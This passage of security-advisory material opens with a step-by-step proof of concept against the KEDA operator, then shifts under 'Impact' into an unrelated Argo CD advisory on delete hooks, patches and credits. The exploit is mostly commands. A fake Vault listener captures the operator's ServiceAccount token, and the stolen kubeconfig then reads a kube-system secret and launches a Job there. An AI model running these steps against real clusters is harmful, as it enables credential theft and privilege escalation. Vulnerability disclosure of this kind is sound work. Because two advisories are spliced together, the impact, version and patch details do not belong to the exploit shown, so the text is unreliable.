  context: { cluster: kind, user: tenant, namespace: tenant-a }
current-context: tenant
users:
- name: tenant
  user: { token: ${TOKEN} }
EOF

# Seed a "secret" canary in kube-system to make impact self-evident.
kubectl -n kube-system create secret generic poc-canary --from-literal=canary=KEDA-F1-CANARY-7f3a9c2e
```

### Attack

1. Deploy a listener in the tenant namespace that impersonates a HashiCorp Vault server. It logs the login request body and replies with a well-formed Vault auth envelope. The KEDA operator uses the Vault Go client, which issues the login as an HTTP `PUT`, so the listener must accept all methods.

```sh
kubectl --kubeconfig=./kubeconfig-tenant apply -f - <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata: { name: fake-vault-src, namespace: tenant-a }
data:
  vault.py: |
    import http.server, socketserver, sys, json
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _h(self):
            ln=int(self.headers.get('Content-Length') or 0)
            body=self.rfile.read(ln) if ln else b''
            sys.stdout.write("VAULT-LOGIN %s %s\n%s\n"%(self.command,self.path,body.decode('utf-8','replace'))); sys.stdout.flush()
            r=json.dumps({"auth":{"client_token":"s.poc","lease_duration":3600,"renewable":True,"policies":["default"]}}).encode()
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Content-Length",str(len(r))); self.end_headers(); self.wfile.write(r)
        do_GET=do_POST=do_PUT=do_DELETE=do_OPTIONS=do_HEAD=_h
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",8200),H) as s: s.serve_forever()
apiVersion: v1
kind: Pod
metadata: { name: fake-vault, namespace: tenant-a, labels: { app: fake-vault } }
spec:
  containers:
  - name: vault
    image: python:3.12-slim@sha256:090ba77e2958f6af52a5341f788b50b032dd4ca28377d2893dcf1ecbdfdfe203
    command: ["python3","/src/vault.py"]
    volumeMounts: [{ name: src, mountPath: /src }]
  volumes: [{ name: src, configMap: { name: fake-vault-src } }]
apiVersion: v1
kind: Service
metadata: { name: fake-vault, namespace: tenant-a }
spec:
  selector: { app: fake-vault }
  ports: [{ port: 8200, targetPort: 8200 }]
EOF
kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a wait --for=condition=Ready pod/fake-vault --timeout=120s
```

2. Create the `TriggerAuthentication` (the primitive) and a `ScaledObject` with a `cron` trigger referencing it. With `authentication: kubernetes` and no `credential` block, KEDA defaults `credential.serviceAccount` to the operator pod's own token path.

```sh
kubectl --kubeconfig=./kubeconfig-tenant apply -f - <<'EOF'
apiVersion: keda.sh/v1alpha1
kind: TriggerAuthentication
metadata: { name: vault-auth, namespace: tenant-a }
spec:
  hashiCorpVault:
    address: http://fake-vault.tenant-a.svc:8200   # tenant-controlled destination, no validation
    authentication: kubernetes
    mount: kubernetes
    role: poc
    secrets:
    - { parameter: anything, key: anything, path: secret/data/anything }
apiVersion: keda.sh/v1alpha1
kind: ScaledObject
metadata: { name: poc-so, namespace: tenant-a }
spec:
  scaleTargetRef: { name: poc-target }
  pollingInterval: 5
  minReplicaCount: 0
  maxReplicaCount: 2
  triggers:
  - type: cron
    metadata: { timezone: UTC, start: "0 * * * *", end: "30 * * * *", desiredReplicas: "1" }
    authenticationRef: { name: vault-auth }
apiVersion: apps/v1
kind: Deployment
metadata: { name: poc-target, namespace: tenant-a }
spec:
  replicas: 1
  selector: { matchLabels: { app: poc-target } }
  template:
    metadata: { labels: { app: poc-target } }
    spec:
      containers: [{ name: pause, image: registry.k8s.io/pause:3.10 }]
EOF
```

3. The operator reconciles the `ScaledObject`, builds the scaler, resolves the `authenticationRef`, and PUTs its own ServiceAccount token to the listener as the Vault login body. Read it back:

```sh
sleep 20
kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a logs pod/fake-vault | grep -A1 'VAULT-LOGIN PUT'
# VAULT-LOGIN PUT /v1/auth/kubernetes/login
# {"jwt":"eyJhbGciOiJSUzI1NiIs...","role":"poc"}
```

4. Build a kubeconfig from the stolen token and use it. The token authenticates as the operator ServiceAccount and reads the kube-system Secret the tenant could not read directly:

```sh
STOLEN=$(kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a logs pod/fake-vault \
  | sed -n 's/.*"jwt":"\([^"]*\)".*/\1/p' | head -1)
cat > kubeconfig-stolen <<EOF
apiVersion: v1
kind: Config
clusters:
- name: kind
  cluster: { server: ${SERVER}, certificate-authority-data: ${CA} }
contexts:
- name: stolen
  context: { cluster: kind, user: stolen }
current-context: stolen
users:
- name: stolen
  user: { token: ${STOLEN} }
EOF

kubectl --kubeconfig=./kubeconfig-stolen auth whoami
# Username  system:serviceaccount:keda:keda-operator

kubectl --kubeconfig=./kubeconfig-stolen -n kube-system get secret poc-canary -o jsonpath='{.data.canary}' | base64 -d
# KEDA-F1-CANARY-7f3a9c2e

# The token also creates workloads cluster-wide via batch/jobs; a Job lands a pod in kube-system.
kubectl --kubeconfig=./kubeconfig-stolen -n kube-system create job pwn --image=busybox -- sh -c 'sleep 60'
# job.batch/pwn created
kubectl --kubeconfig=./kubeconfig-stolen -n kube-system get pods -l job-name=pwn
# pwn-q5j5s   1/1   Running   0   8s
```

## Root cause

A namespace tenant should not be able to make the operator authenticate to a tenant-controlled server using the operator's own cluster-privileged identity. The destination address is fully tenant-controlled and unvalidated, and the credential the operator presents defaults to its own ServiceAccount token. The content filter added for the prior arbitrary-file-read advisory checks only that the loaded bytes look like a Kubernetes ServiceAccount token, which is exactly the shape of the operator's own token, so it does not constrain the credential to one the tenant is entitled to use.

### Impact

Argo CD checks an Application's AppProject before it creates resources during a sync. That check covers destination namespaces and servers, cluster-scoped resource allow and deny lists, and namespaced resource allow and deny lists, including resource names. PreDelete and PostDelete hooks skip it. When the Application is deleted, Argo CD creates those hooks with the application-controller's credentials on the destination cluster.

All versions from v2.10.0 onward are affected, including every currently supported release. v2.9.22 and earlier are not. PostDelete hooks were introduced in [dcc17f70bf](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) (2023-12-18, [#16595](https://github.com/argoproj/argo-cd/pull/16595)) and first released in v2.10.0. That creation path has never applied the project check. PreDelete hooks, added in [3bf3d8a212](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) (2025-12-05, [#22288](https://github.com/argoproj/argo-cd/pull/22288)) and first released in v3.3.0, use the same path. v3.2.12 and earlier do not have PreDelete hooks. PreSync, Sync, PostSync, and SyncFail hooks still go through the project check.

A user who can push to the Git repository an Application syncs from can commit a hook whose namespace, group, kind, or name the AppProject would refuse on sync. The controller adds the delete finalizer when it sees the hook, and the Application stays Synced until someone deletes it. Deleting the Application creates the hook. What that can reach is bounded by the application-controller's access to the destination cluster. In a typical install that access is broad, so a tenant can create a cluster-scoped object such as a `ClusterRoleBinding`, or an object in a namespace the project does not allow. A hook with no deletion policy is removed after it succeeds. A deletion policy that does not remove the hook on success leaves the object in the cluster. A hook such as a Job can create further objects that Argo CD does not clean up.

### Patches

A patch for this vulnerability has been released in the following Argo CD versions:

* v3.6.0-rc2
* v3.5.4
* v3.4.10
* v3.3.15

The fix applies the same AppProject destination and resource checks used on sync before creating a PreDelete or PostDelete hook.

Argo CD 2.x and 3.0 through 3.2 are out of support and will not receive a patch. Upgrade to a patched 3.3 or newer release.

### Workarounds

There is no configuration setting that applies the project check to delete hooks while those hooks stay in use.

* Do not grant untrusted users write access to Git repositories that back Applications in restrictive AppProjects.
* Limit who can delete Applications. Deletion is what runs PreDelete and PostDelete hooks.
* Tighten the application-controller's Kubernetes access so a hook cannot reach sensitive namespaces or APIs.

### Credits

The Argo CD team would like to thank @RealFakeAccount, @AdamKorcz, @0xshylines, @thevilledev, @HenriWilliams, @cherez0ff, @ARSB1, and @zwindler for responsibly disclosing this issue according to our [security reporting guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).

### References

* PostDelete introducing commit: [dcc17f70bf7db973fe480b8b613189b2c5ac4b4b](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) ([#16595](https://github.com/argoproj/argo-cd/pull/16595)), first released in v2.10.0
* PreDelete introducing commit: [3bf3d8a2124e772ac651f3fd42375c4e9b8008af](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) ([#22288](https://github.com/argoproj/argo-cd/pull/22288)), first released in v3.3.0
* [AppProject specification](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/)
* [Resource hooks](https://argo-cd.readthedocs.io/en/stable/user-guide/resource_hooks/)

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd
